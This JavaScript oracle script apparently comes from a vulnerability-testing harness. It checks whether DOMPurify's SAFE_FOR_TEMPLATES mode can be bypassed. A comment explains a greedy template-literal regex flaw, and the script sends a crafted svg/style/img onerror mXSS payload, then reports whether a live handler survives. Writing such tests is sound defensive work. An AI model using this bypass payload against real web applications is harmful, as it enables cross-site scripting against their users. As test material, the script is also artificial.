'use strict';
const { JSDOM } = require('jsdom');

function main() {
  let createDOMPurify;
  try {
    createDOMPurify = require('dompurify');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  let window;
  try {
    const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
    window = dom.window;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup failed while building jsdom window: ' + String(e && e.message)
    }));
    return;
  }

  let DOMPurify;
  try {
    DOMPurify = createDOMPurify(window);
    if (!DOMPurify || typeof DOMPurify.sanitize !== 'function') {
      throw new Error('DOMPurify instance missing sanitize function');
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup failed while creating DOMPurify instance: ' + String(e && e.message)
    }));
    return;
  }

  // Benign operation: sanitize a normal, properly closed template-literal-like
  // string under SAFE_FOR_TEMPLATES. Must produce a plain sanitized string
  // with the literal markers replaced and no live script content.
  let benignResult;
  try {
    const benignInput = '<p>Hello ${name} world</p>';
    benignResult = DOMPurify.sanitize(benignInput, { SAFE_FOR_TEMPLATES: true });
    if (typeof benignResult !== 'string') {
      throw new Error('benign sanitize did not return a string');
    }
    if (benignResult.indexOf('<script') !== -1) {
      throw new Error('benign sanitize unexpectedly left a script tag');
    }
    if (benignResult.indexOf('Hello') === -1) {
      throw new Error('benign sanitize unexpectedly removed benign content');
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign sanitize operation failed: ' + String(e && e.message)
    }));
    return;
  }

  // Only after the benign call succeeds can operation_completed become true.
  const operation_completed = true;

  // Malicious input exploiting the incorrect TMPLIT_EXPR regex
  // (vulnerable: /\$\{[\w\W]*/gm has no requirement for a closing brace,
  // so it greedily swallows everything from "${" to the end of the string
  // during the textContent neutralization pass, rather than being confined
  // to a matched ${...} span). This mismatch between what gets matched
  // during the SAFE_FOR_TEMPLATES neutralization pass and what survives
  // DOM parsing/serialization allows an attacker to smuggle a live element
  // (e.g. an <img onerror=...>) inside an unterminated template-literal
  // opening so that after sanitization + serialization the dangerous
  // attribute mutates back into a live, executable form (mXSS).
  let exploit_succeeded = false;
  let evidence = '';
  try {
    const marker = 'ORACLE_MARKER_' + Date.now() + '_' + Math.random().toString(36).slice(2);
    const maliciousInput =
      '<svg><style>${</style><img src=x onerror="window.__' + marker + '__=1">}</svg>';

    const maliciousResult = DOMPurify.sanitize(maliciousInput, { SAFE_FOR_TEMPLATES: true });

    if (typeof maliciousResult !== 'string') {
      throw new Error('malicious sanitize did not return a string');
    }

    const hasLiveOnerror = /onerror\s*=/i.test(maliciousResult) &&
      maliciousResult.indexOf(marker) !== -1;

    if (hasLiveOnerror) {
      exploit_succeeded = true;
      evidence = 'Sanitized output retained a live onerror handler for crafted template-literal payload: ' +
        maliciousResult.slice(0, 300);
    } else {
      exploit_succeeded = false;
      evidence = 'Sanitized output neutralized the crafted template-literal payload: ' +
        maliciousResult.slice(0, 300);
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious sanitize call raised an exception (treated as blocked): ' + String(e && e.message);
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
